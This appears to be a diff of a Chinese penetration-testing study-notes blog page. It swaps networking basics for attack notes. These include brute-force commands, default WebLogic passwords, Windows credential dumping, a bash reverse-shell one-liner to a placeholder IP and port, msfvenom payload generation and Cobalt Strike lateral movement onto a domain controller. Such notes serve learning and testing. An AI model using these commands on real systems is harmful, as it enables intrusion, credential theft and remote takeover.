+<td>Samba系统间文件共享</td>
+<td>MS17-010、弱口令</td>
+</tr>
+<tr>
+<td>TCP&#x2F;3306</td>
+<td>MySQL</td>
+<td>弱口令、注入</td>
+</tr>
+<tr>
+<td>TCP&#x2F;3389</td>
+<td>RDP（win远程桌面服务默认端口）</td>
+<td>爆破、MS12_020、CVE-2019-0708</td>
+</tr>
+<tr>
+<td>6379</td>
+<td>Redis</td>
+<td>爆破、主从复制、未授权访问</td>
+</tr>
+<tr>
+<td>7001</td>
+<td>WebLogic</td>
+<td>弱口令、SSRF、反序列化</td>
+</tr>
+<tr>
+<td>TCP&#x2F;8080</td>
+<td>Tomcat</td>
+<td>远程代码、文件上传漏洞</td>
+</tr>
+<tr>
+<td>8888</td>
+<td>宝塔面板</td>
+<td>弱口令爆破</td>
+</tr>
+</tbody></table>
+<p><span class="exturl" data-url="aHR0cHM6Ly9jdmUubWl0cmUub3JnLw==">CVE<i class="fa fa-external-link-alt"></i></span>：通用漏洞纰漏；[NVD](<span class="exturl" data-url="aHR0cHM6Ly9udmQubmlzdC5nb3Yv">NVD - Home (nist.gov)<i class="fa fa-external-link-alt"></i></span>)：美国国家通用漏洞数据库；<span class="exturl" data-url="aHR0cHM6Ly93d3cuY252ZC5vcmcuY24v">CNVD<i class="fa fa-external-link-alt"></i></span>：国家信息安全漏洞共享平台；<span class="exturl" data-url="aHR0cHM6Ly93d3cuY25udmQub3JnLmNuLw==">CNNVD<i class="fa fa-external-link-alt"></i></span>：国家信息安全漏洞库</p>
+<p><strong>中间件漏洞</strong>：</p>
+<ul>
+<li><p>Weblogic：Java应用服务器，JavaEE开发，默认7001端口，区别于Nginx等Web部署服务器，类似于tomcat；URL后输入console进入管理员界面，然后可以同样部署WAR包；相关漏洞扫描工具：Weblogic Scan；</p>
+<p>控制台路径泄露（SSRF）：CVE-2014-4210；任意文件上传漏洞：CVE-2018-2894；XMLDecoder反序列化：CVE-2017-10271、CVE-2020-14859、CVE-2017-3506；Java反序列化：CVE-2016-0638、CVE-2019-2729、CVE-2019-2890</p>
+<blockquote>
+<p>老版本中存在弱口令：用户名密码均为：Weblogic、system、portaladmin、guest（也可交叉）；</p>
+</blockquote>
+</li>
+<li><p>Struct2：JavaEE开发的MVC框架，同样web应用服务器，后缀为.do、.action使用该框架；访问&#x2F;struct&#x2F;webconsole.html，并使devMode&#x3D;true；CVE-2017-9805</p>
+</li>
+<li><p>Tomcat：轻量应用服务器，默认端口8080，部分默认配置不安全，攻击者借助JDK自带的JAR.exe可以将🐎打包成WAR，在<code>Tomcat Manager</code>中上传🐎（需要有manager权限）；<code>/conf/tomcat-users.xml</code>文件中进行配置，默认使用弱口令</p>
+<blockquote>
+<p>tomcat中特殊使用后缀.war，用于将html、css、js等打包为压缩包</p>
+</blockquote>
+</li>
+<li><p>JBoss：J2E开发应用服务器，管理EJB的容器和服务器，基于tomcat，默认端口8080；默认情况下无需输入账户信息即可登录后台<code>JMX console</code>下的<code>flavor=URL type=DeploymentScanner</code>可以输入url来进行远程WAR包下载部署</p>
+</li>
+<li><p>ThinkPHP：国产“十年磨一剑”，默认端口9000，扫描工具：TPScan；命令执行漏洞检测工具：tp5-getshell</p>
+</li>
+<li><p>Spring：Boot等为Spring的扩展，旨在专门领域，存在Actuators反序列化，为专门监控模块，&#x2F;env下查看配置信息；扫描工具：SB-Actuator；</p>
+</li>
+<li><p>Fastjson：json解析器，为了把json数据格式转换为相应的对象，json bean-&gt;json为序列化，反过来就是反序列化；漏洞扫描工具：fastjson_rce_tool；</p>
+</li>
+<li><p>Shiro：Java的一种安全框架，可在JSE、JEE上运行，可以进行认证、授权、加密等功能；抓包后若存在<code>rememberme=deleteMe</code>（在set-cookie处）则证明使用该框架；漏洞扫描工具：Shiro-Scan</p>
+</li>
+</ul>
+<p><strong>爆破</strong>：</p>
+<p>主要以数据库为主，其他后台原理类似。主要爆破数据库：SQL Server的SA用户，MySQL的root用户、Oracle的System用户为主。工具：Hydra、Nmap、X-scan、CrackDB、Ncrack、BurpSuite（多用于B&#x2F;S架构）</p>
 <ol>
-<li>在ISP（互联网服务提供商）处架设CDN集群</li>
-<li>在关键的IXP（因特网交换点）先放置CDN，之后邀请ISP入驻</li>
-<li>根据地理位置和地区流量检测选择布置</li>
+<li><p>Hydra：支持FTP、MSSQL、POP3、SSH、MYSQL等</p>
+<pre><code>hydra.exe -L c:\user.txt -P c:\passwd.txt 192.168.1.1 mysql	//破解MySQL密码
+hydra.exe -L ~ -P ~ -e n -t 5 192.168.1.1 ssh
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>参数</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-S</td>
+<td>使用SSL链接</td>
+</tr>
+<tr>
+<td>-s</td>
+<td>采用指定端口</td>
+</tr>
+<tr>
+<td>-L</td>
+<td>指定用户名字典&#x2F;小写指定用户名</td>
+</tr>
+<tr>
+<td>-P</td>
+<td>指定密码字典&#x2F;小写指定密码</td>
+</tr>
+<tr>
+<td>-t</td>
+<td>指定线程数</td>
+</tr>
+<tr>
+<td>-e</td>
+<td>n：空密码试探；s：使用指定账户密码试探</td>
+</tr>
+<tr>
+<td>-f</td>
+<td>找到一个后就立马停止</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>Medusa：模块化设计，<code>medusa -d</code>查看可利用模块，命令参数与前者差不多</p>
+<pre><code class="bash">基本语法：medusa 主机名 用户名 密码 -M 模块
+medusa -h 192.168.1.1 -u root -P /passwd.txt -M mysql
+medusa -h ~ -u sa -P ~ -t 5 -e ns -M mysql -O /ap.txt	//成功信息记录到日志中
+</code></pre>
+</li>
 </ol>
-<hr>
-<h3 id="虚拟机网络配置"><a href="#虚拟机网络配置" class="headerlink" title="虚拟机网络配置"></a>虚拟机网络配置</h3><ul>
-<li><p><strong>NAT</strong>（默认）：内部设置分配私有地址，外网无法访问；在每个虚拟机中虚拟机软件会创建一个默认网关（IP固定），之后虚拟机上网流量必定经过本网关，再到宿主机，因此各个虚拟机之间无法交流；</p>
-<p>宿主相对于虚拟机来说是外网，虚拟机可以访问宿主，但不能反过来</p>
-</li>
-<li><p><strong>NAT网络&#x2F;模式</strong>：虚拟机之间可以相互连接，相较于NAT来说，有一个虚拟网关、DHCP、交换机将各个虚拟机存放在同一个网络之中，可以访问互联网；搭建靶场！！！</p>
-</li>
-<li><p><strong>桥接</strong>：虚拟机与宿主机平级，会占用多个宿主网关的分配地址，之间可以互ping</p>
-</li>
-<li><p><strong>内部网络</strong>：虚拟机可以互通，但是无法与宿主交流，相当于虚拟机们自己在一个独立的网络中；如果要互ping，需要提前配置网络</p>
-</li>
-<li><p><strong>仅主机模式</strong>：相较于内部网络，会自动分配IP地址（有DHCP），而且可以与宿主互ping，但是不能上网</p>
-</li>
-</ul>
-<hr>
-<h3 id="VPN"><a href="#VPN" class="headerlink" title="VPN"></a>VPN</h3><p>虚拟专用网络VPN，旨在提供一种安全连接到网络服务器的方式；</p>
-<p>从两端类型来说分为：</p>
+<p>防治措施：使用强密码、图片、邮箱、手机验证码（一定要设置时间）、登录次数限制</p>
+<p><strong>旁注攻击</strong>：</p>
+<p>当目标防护措施无懈可击时，可以通过攻击在同一IP&#x2F;服务器下的其他网站来获取目标机器权限，之后进行提权获得该台机器的最高权限，之后再攻击目标网站</p>
 <ul>
-<li><p>站点对站点VPN：两端的地点相对固定；</p>
-</li>
-<li><p>客户端对站点VPN&#x2F;远程登陆VPN：全隧道模式（所有数据都通过）+半隧道模式（部分数据通过）；</p>
-</li>
+<li>IP逆向查询：使用网络空间搜索引擎、google-hacking、查询软件ScScaner；</li>
+<li>SQL旁注&#x2F;跨库查询攻击：归因于管理员没有分配好数据库用户权限，多用于虚拟主机&#x2F;NAT鸡&#x2F;轻量专用服务器等。</li>
+<li>目录越权：A用户可以操作B用户网站所在目录。</li>
+<li>CDN查询真实IP：phpinfo()、对子域名进行查询、DNSlog来多地ping</li>
 </ul>
-<p>加密方式：AES+3DES；保护完整性：Hash；认证：PSK+RSA</p>
-<p>根据使用的协议：IPsec VPN和SSL&#x2F;TLS VPN</p>
-<ul>
-<li><p><strong>IPsec VPN</strong>：</p>
-<p>IPsec协议位于网络层，多用于站点对站点传输；其VPN有两个主要模式：传输模式（也叫半隧道模式）与隧道模式，在传输模式种并非所有的数据都会经过加密，而后者则会全部加密甚至是IP头。</p>
-<p>需要网络中设备安装相应软件并经过身份验证、使得网络管理可见性更广（更底层）</p>
-</li>
-<li><p><strong>SSL VPN</strong>：</p>
-<p>SSL&#x2F;TLS位于应用层与传输层之间，多用于客户端对站点传输；其VPN模式：门户模式（特定网页或Web应用）和隧道模式（甚至可以访问非Web应用）；</p>
-<p>SSL协议广泛应用于浏览器中（多亏HTTPS）因此部署成本较低，只需开放443端口、可以部署在内网中的任一个节点上，移动性强、缺少身份验证可能有安全问题、管理繁琐，需要管理员设置模式</p>
-</li>
-</ul>
-<hr>
-<h3 id="Tor"><a href="#Tor" class="headerlink" title="Tor"></a>Tor</h3><p>洋葱网络&#x2F;路由，一种“代理节点快速动态变化的加密三重代理”，相当于多重VPN；默认情况下Tor通过3个中继器进行跳转：Guard中继器、Middle中继器、Exit中继器。</p>
-<ul>
-<li><p><strong>中继器</strong>：当Alice想要访问Bob时，会在Tor服务器中选择上述三种中继器各一个，而且会定时重组选择新的中继器。为了防止所有的Tor中继器被阻塞，每次只会给用户一小部分的中继器信息。</p>
-</li>
-<li><p><strong>加密过程</strong>：Alice与Guard中继器借助Curve25519椭圆曲线生成一个对称密钥key1，之后Alice使用Guard中继器作为加密跳板来与Middle中继器继续生成key2，以此类推。</p>
-<p>最后Alice有了3把key，每当Alice想要访问Bob时，会依次使用key1、key2、key3对数据包进行加密，每经过一个中继器就解一次密，也就是Exit中继器能看到最终传输内容</p>
-</li>
-</ul>
-<hr>
-<h3 id="P2P"><a href="#P2P" class="headerlink" title="P2P"></a>P2P</h3><p>peer to peer，即点对点技术，又叫做互联网络对等技术。每个结点即能充当服务器又能充当客户，基本不存在带宽问题；为实现跨内网交流，要将内网IP更换为公网IP（NAT），从而到达另一个内网；</p>
-<p><strong>NAT</strong>：</p>
-<p>网络地址转换技术，是一种将数据包中IP地址更换为其他IP地址的功能，常由路由器或防火墙实现；目前代指动态NAT（即NAPT），不仅会改IP地址，还能改变数据报的TCP&#x2F;UDP端口</p>
-<p>术语：内部Tuple、外部Tuple、目标Tuple、打洞hole punch；Tuple&#x3D;IP+Port</p>
-<ol>
-<li>完全锥形NAT：传统NAT，内部Tuple单独占一个外部Tuple</li>
-<li>地址限制型锥型NAT：在锥型基础上，只有之前内部主机联系过的IP才能借助之前的外部Tuple联系，只能发送UDP报文</li>
-<li>端口限制圆锥型NAT：在地址限制型基础上，外部机器B想要与A联系，就要用A之前联系B时的目标Tuple（Ip+端口）向外部Tuple通信</li>
-<li>对称型NAT：内外交流双方构成的【内部Tuple-目标Tuple】对，单独占用NAT后的一个外部Tuple；而外部IP也只能通过该固定的<strong>外部Tuple</strong>来访问内部；即不仅限制了外部的IP和端口，也限制了内部的IP和端口</li>
+<h3 id="内网信息搜集"><a href="#内网信息搜集" class="headerlink" title="内网信息搜集"></a>内网信息搜集</h3><ol>
+<li>服务器支持的脚本语言</li>
+<li>服务器端口探测</li>
+<li>路径信息</li>
 </ol>
-<p><strong>NAT穿透&#x2F;打洞</strong>：</p>
-<p>有了NAT技术之后，任意两个在内网的客户端想要通信，就要建立隧道&#x2F;打洞</p>
+<h4 id="Windows内网信息搜集："><a href="#Windows内网信息搜集：" class="headerlink" title="Windows内网信息搜集："></a>Windows内网信息搜集：</h4><p>目标搜集内容：IP、网关、DNS、DMZ（隔离区、位于外网与内网连接处）、工作组、域</p>
+<blockquote>
+<p>工作组中各个用户可以相互访问，组间也可以相互访问，只是名义上的普通分组。在win中专属的域机制，域之间不可直接访问，实行中心化管理机制“DC”即域控，每一个想要进入该域的机器通过Kerberos协议先访问DC，DC中存储域内用户相关信息“AD”即活动目录，经过SAM来进行NTLM验证对比，有账号管理、软件环境集中管理等。一个域中至少两个DC+AD，域间DNS查询位置</p>
+</blockquote>
+<p>cmd中<code>systeminfo</code>查看机器有关信息；密码存储位置：注册表&#x2F;文件；<code>$I</code>开头的表示文件保存路径，<code>$R</code>开头表示内容；<code>netsh</code>后<code>wlan show profile</code>查看连接过的wifi配置；杀软一般不对内存进行查杀，使用ps脚本（downloadstring）远程下载或webdelivery绕过查杀，；minikatz获取cookie；</p>
+<p>在win server中使用&#96;&#96;net&#96;命令查看域；端口识别389（LDMP、ILS、目录访问）53（DNS）；</p>
+<p>协议-工具：netbios-nbtscan；UDP-unicornscan；ICMP（ping命令，ip层）；ARP-arpscan；</p>
+<p>win下的密码凭证获取：密码格式&#x3D;名称:ID:LM-hash:NTLM-hash:::（在win03server后LM部分不用）；认证过程（本地、网络、域）</p>
+<p>本地：pwd与\system32\config\sam中对比，打开时会显示被另一个程序使用PID&#x3D;4的system，早期版本一直会被lasaa.exe进程使用（win11目前还有），如果一直在内存中，可能拿到明文密码；</p>
+<p>域内：需要windows\NTDS下的ntds.dit文件 + sam文件 (同上)+ system32\config\system.hive文件；使用卷影（Volume Shadow Copy）服务查看已被使用文件，在Server系统上有默认的<code>ntdsutil</code>命令进行挂载，其他工具Vssadmin、Vshadow（MS SDK中有，VStudio）、NinjaCopy；</p>
+<p>密码抓取工具：先用<code>esentutil</code>对ntds.dit文件进行修复，再QuarksPwDump、NtdsAudit、minikatz、PowerSpolit（工具集）拉取密码，再网站或彩虹表解密；</p>
+<p>彩虹表-ophcrack；官方扩展工具包procdump+minikatz配合食用；注册表reg save；laZagne自助脚本获取密码；MySQL中<code>.frm .myd .myi</code>分别表示表结构、数据（winhex打开）、索引树（cmd5网站破解）；常用密码破解软件john、Hydra、Hashcat、Medusa；SharpDecryptPwd.exe破解常用软件密码；</p>
+<h4 id="Linux下信息搜集"><a href="#Linux下信息搜集" class="headerlink" title="Linux下信息搜集"></a>Linux下信息搜集</h4><p><code>msfvenom -p linux/x64/meterpreter/reverse_tcp</code>生成小马，上传之后之后chmod，执行得到meterpreter，以<code>./xxx&amp;</code>表示在后台运行；或者shell中<code>python -c &quot;import pty;pty.spwan(&#39;/bin/bash&#39;)&quot;</code>以shell交互执行</p>
+<pre><code>uname -a //获取系统信息
+ps -elf //列出全部进程（快照），在/proc下有所有进程信息
+top //实时任务管理，root的uid=0，普通用户的uid&gt;1000
+last //最近登陆状态
+lastb //最近失败登录，减少爆破用强密码或者更换ssh端口
+service --status -all //查看服务器状态
+iptables //防火墙
+netstat // 网络状态
+</code></pre>
+<p>重要文件目录：</p>
+<p>&#x2F;etc&#x2F;issue登陆提示前的消息；&#x2F;etc&#x2F;lsb-release或&#x2F;redhat-release或&#x2F;os-release中系统版本信息；&#x2F;etc&#x2F;crontab计划任务；</p>
+<p>&#x2F;proc&#x2F;version存放Linux内核版本+gcc版本；&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;version监视内核构建时间；</p>
+<p>&#x2F;var&#x2F;log日志；&#x2F;etc&#x2F;passwd用户+组+id+用户目录；&#x2F;etc&#x2F;shadow存放用户和hash过的密码；</p>
+<p>.ssh文件下&#x2F;id_rsa存放RSA私钥、&#x2F;authorized、&#x2F;id_rsa.pub存放公钥；</p>
+<hr>
+<h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><p>在win中</p>
 <ul>
-<li>1-1、1-2、1-3、1-4打洞：中间服务器C把A和B的外部Turple相互告诉，任意外部都可联系内部</li>
-<li>2-2、2-3、2-4、3-3打洞：先同上，由于IP地址受限，因此需要A直接先向B发送连接（A开了一个针对B的口），之后A通过C向B发送邀请（B此时是没有与A连接的，因为B之前没有连过A），让B也直接向A发送邀请（B开了一个针对A的口，两端成功连接）；根据类型指定IP或Port</li>
-<li>3-4、4-4常规方法无法打洞</li>
+<li><p>ftp命令，从攻击机&#x2F;服务器上下载脚本，anonymous进行匿名化；</p>
+</li>
+<li><p>Bitsadmin自带工具，在PS中有wget、curl、iwr等网络下载工具；</p>
+</li>
+<li><p>Certutil还可管理证书<code>C:\Users\Lenovo\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content</code>中有缓存，Scp：用户@IP；</p>
+</li>
+<li><p>rundll32.exe用于运行下载的dll；</p>
+</li>
+<li><p>PS脚本：IEX函数将字符串当命令执行，-enc接受base64过的命令</p>
+</li>
 </ul>
 <blockquote>
-<p>更多细节参考<span class="exturl" data-url="aHR0cHM6Ly9qdWVqaW4uY24vcG9zdC82ODQ0OTA0MDk4NTcyMDA5NDg1">NAT基本原理及穿透详解(打洞)<i class="fa fa-external-link-alt"></i></span></p>
+<p>HTA &#x3D; html app</p>
 </blockquote>
-<p><strong>BitTorrent</strong>：</p>
-<p>一种用于文件分发的流行P2P协议，会将文件划分为大小相等的n块</p>
-<ul>
-<li><p><strong>洪流(torrent）</strong>：是参与一个特定文件分发的集合，每个个体叫对等方，以等长文件块（256KB）为单位</p>
-</li>
-<li><p><strong>追踪器（tracker）</strong>：划分洪流，登记新来的对等方，将对等方的IP发送给新来的（杂p2p，并不是非常的对等，因为tracker也需要服务器）</p>
-</li>
-<li><p><strong>种子</strong>：制作<code>.torrent</code>文件，其中包含Tracker服务器地址、文件大小、文件名、块大小等</p>
-<p>在拿到之后，会先连接Tracker服务器，之后验证缺少信息并交换信息</p>
-</li>
-<li><p><strong>磁力链接</strong>：格式<code>magnet:?xt=urn:bith:~~~~</code>后面跟一串40位16进制的数字；<code>magnet</code>协议名，<code>xt</code>表示资源定位点，<code>urn:bith</code>表示Hash名，采用URN来定位资源，Hash值即为资源的唯一命名</p>
-</li>
-<li><p><strong>最稀缺优先</strong>：具有该洪流中的块列表，资源数最少的块，最先互传；</p>
-</li>
-<li><p><strong>一报还一报</strong>：向我传送速率最高的对等方获得我方的优先权，规定n个疏通，剩余的阻塞</p>
-</li>
-</ul>
-<p>P2P应用：分布式计算（区块链）、文件共享、流媒体、IP层语音通信（VoIP）、游戏平台</p>
+<p>Linux：wget、curl、netcat、sftp</p>
+<p>脚本：php、py2、py3、perl、javascript、VBscript、ruby、Lua、Bash、R、Powershell、Jscript</p>
+<blockquote>
+<p>B语言后来借MS发展为VB，VBS大多在网页中用，VBA作为宏语言在应用中嵌入使用</p>
+</blockquote>
 <hr>
-<h3 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h3><p>Firewall，作用：限制外来用户、限定用户访问特定站点。可以在单独的硬件上，也可以作为软件；作为硬件一般叫做网络防火墙，需要针对广泛的连接进行配置，而后者又叫软件&#x2F;主机防火墙，可以针对单独的机器设备进行定制。</p>
+<h3 id="反弹SHELL"><a href="#反弹SHELL" class="headerlink" title="反弹SHELL"></a>反弹SHELL</h3><p>反弹shell原因是，方便进行命令输入，且能够看到回显，而且是交互式的；有在线网站生成</p>
+<h4 id="win下反弹shell"><a href="#win下反弹shell" class="headerlink" title="win下反弹shell"></a>win下反弹shell</h4><ol>
+<li><p>由被控制端将cmd进行重定向到网络中控制端的某一正在监听的端口（反向）；被控端重定向cmd到本地的一个端口，由控制端主动连接</p>
+</li>
+<li><p>Mshta.exe：可以解释并执行.hta（可借此利用js、vbs），payload可由MSF生成</p>
+</li>
+<li><p>Rundll32.exe：可以在内存中加载运行.dll文件，payload由MSF生成</p>
+<blockquote>
+<p>区别于rundl132.exe，为蠕虫变种病毒</p>
+</blockquote>
+</li>
+<li><p>Regsvr32.exe：用于注册&#x2F;注销OLE控件，存在于System32文件夹中</p>
+</li>
+<li><p>Curtutil.exe、powershell（代码混淆Invoke-Obfuscation）</p>
+</li>
+<li><p>msiexe.exe：win上的专门安装文件.msi，MSF可以生成payload</p>
+</li>
+</ol>
+<h4 id="Linux下反弹shell"><a href="#Linux下反弹shell" class="headerlink" title="Linux下反弹shell"></a>Linux下反弹shell</h4><p>标准文件描述符：</p>
 <ul>
-<li><p>两种分段模型：</p>
-<ul>
-<li><p>外部网络—屏蔽主机防火墙—内部网络；</p>
-</li>
-<li><p>外部网络—屏蔽路由器—边界网络&#x3D;DMZ隔离区—屏蔽路由器—内部网络</p>
-</li>
+<li>0-stdin-将键盘当作输入</li>
+<li>1-stdout-将显示器作为默认输出</li>
+<li>2-stderr-将报错输出默认输出到显示器</li>
 </ul>
-</li>
-<li><p>过滤标准：源IP、目标IP、内容、协议</p>
-</li>
-<li><p><strong>工作模式</strong>：</p>
-<ul>
-<li>路由&#x2F;网关模式：将防火墙当作路由器使用，内外接口处于不同的子网之中，需要更改网络拓扑</li>
-<li>透明模式&#x2F;桥模式：将防火墙当作交换机，类似于路由器中的仅接内部网，可以互相通信，无IP</li>
-<li>混合模式：防火墙1网关模式，防火墙2桥模式，之后连接防火墙，防火墙1启动VRRP（虚拟路由器冗余协议）进行备份</li>
-</ul>
-</li>
-<li><p><strong>FireWall类型</strong>：</p>
-<ul>
-<li>静态包过滤&#x2F;无状态检测防火墙：运行于OSI的网络层；类似于HTTP的无状态，每一个数据包都需要检查，因此对手动创建的接入控制列表要求较高</li>
-<li>电路级网关防火墙：运行在会话层；连接一段时间后仍无异样，就停止监视</li>
-<li>动态包过滤&#x2F;状态检测防火墙：作用域传输层及以上；能够监控持续的连接</li>
-<li>代理防火墙&#x2F;应用层防火墙：运行在应用层；相当于有代理作用的防火墙</li>
-<li>混合型：不多bb</li>
-</ul>
-</li>
-</ul>
-<p><strong>WAF</strong>：Web应用防火墙，过滤监视HTTP通信来保护Web应用程序；应用层防御；负安全模型（黑名单）&#x2F;肯安全模型（白名单）；预防SQL注入、XSS、文件上传、第七层Dos攻击等</p>
-<p>基于网络的WAF—基于主机的WAF：专门的硬件—作为软件集成，消耗本地资源</p>
-<p>基于云的WAF：云服务商将对去到服务器的流量进行检测</p>
+<p>更改标准输出：</p>
+<pre><code class="bash">exec 1&gt;test
+echo &#39;hello world&#39;1&gt;test	//追加的话需要换成“&gt;&gt;”
+</code></pre>
+<p>更改标准输入：</p>
+<pre><code class="bash">read user 键盘输入+回车;	echo $user	//将键盘输入作为user变量的值
+read user 0&lt; test;	echo $user	//将test文件中的内容赋给user变量
+exec 2&gt;test	//将所有的错误显示到test文件中.....................
+</code></pre>
+<p>自定义描述符：</p>
+<pre><code class="bash">exec 5&gt;test; echo&#39;hello&#39; 1&gt;&amp;5	//在test文件中存放‘hello’，&amp;引用文件描述符
+</code></pre>
+<p><code>/dev/null</code>将任何写入该目录下的东西清空，<code>cat /dev/null &gt;test</code>可用于快速清楚test文件中的内容；下面是常用bash反弹shell命令，更多请见[反弹shell](<span class="exturl" data-url="aHR0cHM6Ly93d3cucmV2c2hlbGxzLmNvbS8=">Online - Reverse Shell Generator (revshells.com)<i class="fa fa-external-link-alt"></i></span>)</p>
+<p>被控端<code>bash -i &gt;&amp; /dev/tcp/IP/PORT 0&gt;&amp;1</code>，控制端<code>nc -lvvp IP:Port</code></p>
+<blockquote>
+<p><code>bash -i</code>表示交互式shell，<code>&gt;&amp;</code>用于混合输出（正确错误信息均反弹回来），<code>/dev/tcp</code>通过此文件与目标建立tcp链接，同理也有UDP</p>
+</blockquote>
+<p>反弹shell类型：</p>
+<ol>
+<li>nc进行正向与反向shell+监听，搭配bash</li>
+<li>Perl、PHP、Ruby、Python进行，MSF中可以生成</li>
+<li>Telnet、OpenSSL</li>
+</ol>
 <hr>
-<h3 id="IDS"><a href="#IDS" class="headerlink" title="IDS"></a>IDS</h3><p>入侵检测系统；对攻击、恶意流量、木马进行检测并发出警告；旁路部署在需要关注的链路上；</p>
+<h3 id="隧道代理搭建"><a href="#隧道代理搭建" class="headerlink" title="隧道代理搭建"></a>隧道代理搭建</h3><p>通常为HTTP代理与Socks代理，前者仅用于传输Web应用，后者使用tcp协议建立在传输层，可应用于telnet、FTP、SMTP等，此外在最新的Socks5中还支持DNS域名解析与IPv6解析；通常用于与DMZ中的机器建立通道，以便后续对内网的扫描等，如果内网机器能出网就反向shell，否则就正向shell</p>
 <ul>
-<li><p><strong>CIDF体系</strong>：为IDS通用模型，包括事件产生器+事件数据库+事件分析器+响应单元</p>
+<li><p>CS中的SMB beacon：</p>
 <ol>
-<li><p>事件产生器搜集信息数据，并将其转换为GIDO（通用入侵检测对象）标准格式转交给其他组件</p>
-</li>
-<li><p>事件分析器：接受GIDO，并判断是否构成威胁</p>
-</li>
-<li><p>事件数据库：存储各种事件</p>
-</li>
-<li><p>响应单元：根据GIDO作出反应，终止进程、切断链接、报警等</p>
-</li>
+<li>先开启CS监听器中的beacon SMB</li>
+<li>生成专用SMB木马</li>
+<li>上传至DMZ区中的Web服务器</li>
+<li>使用<code>cpoy 木马 \\域控IP\C$</code>将木马传到域控中</li>
+<li>创建服务<code>sc \\域控IP create 服务名 binpath=&quot;cme.exe /c 木马&quot;</code></li>
+<li>运行该服务<code>sc \\域控IP start 服务名</code></li>
+<li>CS攻击机link域控</li>
 </ol>
 </li>
-<li><p><strong>根据数据源的分类</strong>：</p>
-<ol>
-<li>HIDS：基于主机，数据来源有系统&#x2F;应用日志、审计日志、端口调用情况等</li>
-<li>NIDS：基于网络，对网络中的数据包进行监测分析</li>
-<li>DIDS：分布式，高层次IDS接受低层次的IDS信息</li>
-</ol>
+<li><p>Socks代理工具：EarthWorm、FRP、ProxyChain、reGeorg、sSocks、SocksCap64；</p>
+<p>MSF中：<code>nmap -A -T4 -p- --script vuln IP</code>扫描指定内网IP段；其中还有Socks5模块；</p>
 </li>
-<li><p><strong>根据检测方法的分类</strong>：</p>
-<ol>
-<li>误用检测系统：根据已有库中的攻击模式，对外来入侵判断类型，进行特征模式匹配或借助专家系统判断；误报率低、要求不高、只针对已知攻击</li>
-<li>异常检测系统：设定标准与阈值，当超过该标准时就警报；误报率不易控制、大量信息特征采集</li>
-<li>混合检测系统：不多bb</li>
-</ol>
+<li><p>HTTP代理：支持asp、aspx、php、jsp等；工具：Neo-reGeorg；</p>
 </li>
-<li><p>根据响应方式分类：实时监测、非实时检测</p>
-</li>
-<li><p><strong>误用检测分析方法</strong>：</p>
-<ol>
-<li>模式匹配：依赖于模式库，模式库中存储入侵特征</li>
-<li>专辑系统：专家知识库，形成IF-THEN规则</li>
-<li>状态转换：状态转换图，将入侵过程看作一个行为序列进行分析</li>
-<li>基于信誉检测：检测IP、DNS等是否上过黑名单</li>
-</ol>
-</li>
-<li><p><strong>异常检测方法</strong>：贝叶斯统计、机器学习、神经网络</p>
+<li><p>DNS隧道建立工具Dnscat2，分为中继和直连两种模式；本地浏览器会先找<code>C:\\windows\system\drivers\etc\hosts</code>文件后，没有目标后再去寻找DNS服务器，解析类型如下：</p>
 </li>
 </ul>
-<p><strong>IPS</strong>：入侵防御系统，区别于IDS，在检测到威胁时，能够自动阻止攻击并采取行动。由于需要流量经过因此需要串行部署。检测方法与IDS相似，这里不多冗余</p>
-<p>根据安装的宿主分为：网络入侵防御系统NIPS、主机入侵防御系统HIPS，前者检测分析流量，后者监测文件进程</p>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>A&#x2F;AA</td>
+<td>IPv4&#x2F;IPv6</td>
+</tr>
+<tr>
+<td>CNAME</td>
+<td>域名的别名</td>
+</tr>
+<tr>
+<td>MX</td>
+<td>smtp邮箱的IP地址</td>
+</tr>
+<tr>
+<td>PTR</td>
+<td>IP反查域名</td>
+</tr>
+<tr>
+<td>NS</td>
+<td>指向一个更大的域名服务器</td>
+</tr>
+<tr>
+<td>SRV</td>
+<td>该服务的IP地址</td>
+</tr>
+</tbody></table>
 <ul>
-<li>核心组件如下：<ul>
-<li>签名库：存放已知攻击特征</li>
-<li>异常检测引擎：检测未知攻击和异常行为</li>
-<li>阻止引擎：根据检测到的类型及威胁等级来才需相应的措施</li>
-<li>管理控制台：配置管理IPS</li>
-<li>日志报告系统：记录IPS活动，生成报告并分析数据</li>
-</ul>
-</li>
+<li>ICMP隧道：工具Pingtunnel，建立在IP层，最后手段</li>
 </ul>
 <hr>
-<h3 id="堡垒机"><a href="#堡垒机" class="headerlink" title="堡垒机"></a>堡垒机</h3><p>也叫做运维审计系统，是一台具备强大防御功能和安全审计功能的服务器，说人话就是控制账户及权限，并记录干了什么的东西。</p>
+<h3 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h3><p>可以从系统、开启的应用、服务等入手查找漏洞；包括溢出提权（系统本身）与第三方组件（其他应用）提权；溢出提权又分为本地溢出和远程溢出，后者通过创建用户并上传exp来进行，后者只需要建立连接然后再利用即可</p>
+<p>win：MS06-067、MS08-067、MS10-084、MS11-014、MS11-05、MS12-020、MS16-032；</p>
+<p>Linux：CVE-2017-7308、CVE-2017-6074、CVE-2017-5123、CVE-2016-9793；</p>
+<p>条件：拿到webshell与普通用户权限、具有某些账号与密码、漏洞与exp</p>
+<h4 id="Win下提权"><a href="#Win下提权" class="headerlink" title="Win下提权"></a>Win下提权</h4><p>提权工具：RottenPotato、OriginPotato、SweetPotato、getsystem.exe、RoguePotato；</p>
+<p>wmic命令可以获取杀软、路径、用户组、应用程序、进程等信息，wmic_info.bat脚本进行信息提取，相似的HIGS.bat、winPEAS.bat、Powerless.bat；</p>
 <ul>
-<li><p><strong>核心功能&#x2F;理念4A</strong>：认证Authen、账号Account、授权Authorize、审计Audit</p>
+<li><p>内核漏洞：wmic检查版本，powershell列出已安装的安全补丁<code>systeminfo</code>，在[相关提权网站](<span class="exturl" data-url="aHR0cHM6Ly9pLmhhY2tpbmc4LmNvbS90aXF1YW4=">提权辅助网页 Windows提权辅助 (hacking8.com)<i class="fa fa-external-link-alt"></i></span>)查找为进行防护的漏洞</p>
 </li>
